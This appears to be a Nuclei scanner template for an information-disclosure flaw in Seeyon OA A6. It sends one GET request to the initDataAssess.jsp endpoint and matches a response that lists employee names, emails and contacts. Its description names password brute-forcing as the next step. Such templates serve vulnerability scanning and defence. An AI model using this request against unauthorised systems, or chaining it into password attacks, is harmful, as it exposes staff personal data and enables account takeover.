id: zhiyuanOA-initDataAssess-userinfo-leak

info:
  name: 致远OA A6 initDataAssess.jsp 用户敏感信息泄露
  author: cnaq
  severity: medium  
  description: 致远OA A6 initDataAssess.jsp 存在用户敏感信息泄露,可以通过得到的用户名爆破用户密码进入后台进一步攻击
  reference: 
    - http://wiki.peiqi.tech/wiki/oa/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20initDataAssess.jsp%20%E7%94%A8%E6%88%B7%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2.html
  tags: zhuyuanOA,userinfo,leak

requests:
  - method: GET
    path:
      - "{{BaseURL}}/yyoa/assess/js/initDataAssess.jsp"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          
      - type: word
        condition: and
        part: body
        words:
          - 'personList[0]'

# 致远OA 员工姓名邮箱联系方式泄露